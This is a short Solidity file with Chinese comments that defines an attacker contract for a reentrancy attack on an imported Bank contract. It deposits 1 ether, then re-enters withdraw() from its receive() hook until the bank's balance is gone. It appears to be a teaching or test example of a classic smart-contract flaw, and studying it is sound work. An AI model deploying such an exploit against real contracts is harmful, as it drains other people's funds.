//重入攻击，攻击合约，当转账给合约是会触发receive方法或者fallback

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.22;
import "../src/Bank.sol";
contract Attack {
    Bank bank;
    //初始化银行合约
    constructor(Bank _bank) {
        bank = _bank;
    }
    //接受主币,再调用取钱方法
    receive() external payable {
        if (bank.getBalance() > 0) {
            bank.withdraw();
        }
    }
    //查询余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    //攻击方法
    function attack() public payable {
        //存钱再取钱,必须带一个主币
        require(msg.value == 1 ether, "Insuficient eth");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}
